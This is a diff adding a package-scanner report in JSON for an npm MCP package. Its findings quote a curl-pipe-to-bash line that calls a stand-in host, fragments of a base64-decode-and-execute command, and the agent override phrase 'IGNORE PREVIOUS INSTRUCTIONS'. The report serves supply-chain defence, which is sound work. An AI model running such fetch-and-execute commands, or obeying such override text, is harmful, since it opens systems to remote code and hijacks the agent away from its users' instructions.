@@ -1,0 +1,87 @@
+{
+  "item": {
+    "source": "mcp-registry",
+    "ecosystem": "npm",
+    "name": "krusch-coding-harness",
+    "version": "0.2.1",
+    "download": null
+  },
+  "archive_sha256": "d945d0a5e80a2c6bab373091617d556389c9589e6565943b19114217552285d3",
+  "findings": [
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "package/test/fixtures/golden-trajectories-100.json",
+      "line": 1491,
+      "evidence": "curl -fsSL https://install.example.invalid/setup.sh | bash",
+      "file_sha256": "4def1bcef4c7ed957bf80c2a072d1f3071fdb87085a56d8a53561393838ae9e3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "package/test/fixtures/golden-trajectories-100.json",
+      "line": 10791,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "4def1bcef4c7ed957bf80c2a072d1f3071fdb87085a56d8a53561393838ae9e3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "package/src/approvals/policy-floor.js",
+      "line": 329,
+      "evidence": "curl ... | sh",
+      "file_sha256": "48b9b75ac32351bdecba65f352c4767a2c3207994f2a8c7d1afeb8cf8f0adf62"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "package/src/approvals/policy-floor.js",
+      "line": 102,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "48b9b75ac32351bdecba65f352c4767a2c3207994f2a8c7d1afeb8cf8f0adf62"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-PACKAGE",
+      "summary": "Package first published 1 day(s) ago",
+      "path": null,
+      "line": null,
+      "evidence": "2026-11-18T23:44:03.143Z",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "advisories.pkg-security.example",
+    "ctlog.cert-monitor.example",
+    "developer.payments-gateway.example",
+    "docs.sdk-registry.example",
+    "dolphinbench.ai",
+    "downloads.hardware-fw.example",
+    "evals.open-benchmarks.example",
+    "evil.example.com",
+    "example.com",
+    "filings.public-docket.example",
+    "generativelanguage.googleapis.com",
+    "github.com",
+    "hol.org",
+    "huggingface.co",
+    "img.shields.io",
+    "install.example.invalid",
+    "krusch.dev",
+    "openrouter.ai",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "static.modelcontextprotocol.io",
+    "status.cloud-vendor.example",
+    "tariffs.grid-utility.example",
+    "trust.enterprise-saas.example"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
